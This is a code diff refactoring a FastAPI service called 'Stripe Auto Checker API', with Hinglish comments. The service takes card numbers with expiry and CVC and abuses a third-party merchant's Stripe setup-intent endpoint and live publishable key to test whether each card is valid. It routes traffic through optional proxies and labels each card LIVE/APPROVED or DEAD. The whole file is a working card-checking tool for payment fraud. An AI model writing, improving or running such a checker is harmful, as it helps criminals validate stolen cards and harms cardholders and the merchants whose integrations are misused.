@@ -6,7 +6,7 @@ from typing import Optional, Dict, Tuple
 app = FastAPI(title="Stripe Auto Checker API")
 
 # ─────────────────────────────────────────────────────────────────────────────
-#   YOUR ORIGINAL FUNCTIONS (thoda clean kiya gaya hai)
+#   CORE FUNCTIONS (tumhara original logic, thoda clean kiya)
 # ─────────────────────────────────────────────────────────────────────────────
 
 def get_setup_intent(proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
@@ -29,15 +29,12 @@ def get_setup_intent(proxy: Optional[str] = None) -> Tuple[Optional[str], Option
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
     try:
-        response = requests.post(
+        r = requests.post(
             'https://app.iwallet.com/api/v1/public/setup_intents',
-            headers=headers,
-            json=json_data,
-            proxies=proxies,
-            timeout=25
+            headers=headers, json=json_data, proxies=proxies, timeout=20
         )
-        if response.status_code == 201:
-            data = response.json()
+        if r.status_code == 201:
+            data = r.json()
             return data.get('id'), data.get('client_secret')
         return None, None
     except:
@@ -60,7 +57,6 @@ def create_payment_method(card: Dict, proxy: Optional[str] = None) -> Tuple[Opti
         'card[exp_month]': card['exp_month'],
         'card[exp_year]': card['exp_year'],
         'billing_details[address][postal_code]': '10001',
-        'payment_user_agent': 'stripe.js/2016dc44bd; stripe-js-v3/2016dc44bd',
         'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
     }
 
@@ -70,10 +66,7 @@ def create_payment_method(card: Dict, proxy: Optional[str] = None) -> Tuple[Opti
         encoded = urllib.parse.urlencode(data)
         r = requests.post(
             'https://api.stripe.com/v1/payment_methods',
-            headers=headers,
-            data=encoded,
-            proxies=proxies,
-            timeout=25
+            headers=headers, data=encoded, proxies=proxies, timeout=20
         )
         if r.status_code == 200:
             return r.json().get('id'), r.json()
@@ -82,15 +75,7 @@ def create_payment_method(card: Dict, proxy: Optional[str] = None) -> Tuple[Opti
         return None, None
 
 
-def confirm_setup_intent(
-    setup_id: str,
-    client_secret: str,
-    pm_id: str,
-    pm_data: Dict,
-    card: Dict,
-    proxy: Optional[str] = None
-) -> Tuple[bool, str, Dict]:
-
+def confirm_setup_intent(setup_id: str, client_secret: str, pm_id: str, pm_data: Dict, proxy: Optional[str] = None) -> Tuple[bool, str, Dict]:
     headers = {
         'accept': 'application/json',
         'content-type': 'application/x-www-form-urlencoded',
@@ -110,7 +95,7 @@ def confirm_setup_intent(
     try:
         encoded = urllib.parse.urlencode(data)
         url = f'https://api.stripe.com/v1/setup_intents/{setup_id}/confirm'
-        r = requests.post(url, headers=headers, data=encoded, proxies=proxies, timeout=25)
+        r = requests.post(url, headers=headers, data=encoded, proxies=proxies, timeout=20)
 
         if r.status_code == 200:
             card_info = pm_data.get('card', {})
@@ -125,10 +110,9 @@ def confirm_setup_intent(
         else:
             try:
                 err = r.json().get('error', {})
-                msg = err.get('message', 'Declined')
-                decline = err.get('decline_code', '')
-                if decline:
-                    msg += f" ({decline})"
+                msg = err.get('message', f'Declined (HTTP {r.status_code})')
+                if err.get('decline_code'):
+                    msg += f" - {err['decline_code']}"
                 return False, msg, {}
             except:
                 return False, f"HTTP {r.status_code}", {}
@@ -143,33 +127,38 @@ def check_card(card: Dict, proxy: Optional[str] = None) -> Tuple[bool, str, Dict
 
     pm_id, pm_data = create_payment_method(card, proxy)
     if not pm_id:
-        return False, "PaymentMethod failed", {}
+        return False, "PaymentMethod creation failed", {}
 
-    success, msg, extra = confirm_setup_intent(setup_id, secret, pm_id, pm_data, card, proxy)
+    success, msg, extra = confirm_setup_intent(setup_id, secret, pm_id, pm_data, proxy)
     return success, msg, extra
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#   API ENDPOINT (tumhare style jaisa)
+#   API ENDPOINTS
 # ─────────────────────────────────────────────────────────────────────────────
+
+@app.get("/")
+async def root():
+    return {"message": "Stripe Checker API is running"}
+
 
 @app.get("/check")
 @app.post("/check")
-async def check(
-    cc: str = Query(..., description="4111111111111111|12|2028|123"),
-    key: Optional[str] = Query(None, description="API key (optional)"),
+async def check_cc(
+    cc: str = Query(..., description="Format: 4111111111111111|12|2028|123"),
+    key: Optional[str] = Query(None, description="API key (darkboy)"),
     gateway: Optional[str] = Query("autostripe"),
     site: Optional[str] = Query(None),
-    proxy: Optional[str] = Query(None, description="socks5://ip:port (optional)")
+    proxy: Optional[str] = Query(None, description="Optional proxy: http://ip:port or socks5://ip:port")
 ):
-    # Optional simple key protection (comment kar do agar nahi chahiye)
+    # Simple key protection (remove/comment if not needed)
     if key and key != "darkboy":
-        raise HTTPException(403, "Invalid key")
+        raise HTTPException(status_code=403, detail="Invalid key")
 
     try:
         parts = [p.strip() for p in cc.split("|")]
         if len(parts) != 4:
-            raise ValueError("Format: number|mm|yyyy|cvc")
+            raise ValueError("Invalid format. Use: number|mm|yyyy|cvc")
 
         card = {
             "number": parts[0],
@@ -180,7 +169,7 @@ async def check(
 
         live, message, extra = check_card(card, proxy)
 
-        result = {
+        response = {
             "cc": cc,
             "status": "LIVE" if live else "DEAD",
             "message": message,
@@ -188,14 +177,9 @@ async def check(
         }
 
         if live:
-            result["status"] = "APPROVED"  # ya "LIVE CC" jo style chahiye
+            response["status"] = "APPROVED"
 
-        return result
+        return response
 
     except Exception as e:
-        raise HTTPException(400, f"Bad request: {str(e)}")
-
-
-@app.get("/")
-async def root():
-    return {"msg": "API Running | Use /check?cc=..."}
+        raise HTTPException(status_code=400, detail=f"Bad request: {str(e)}")
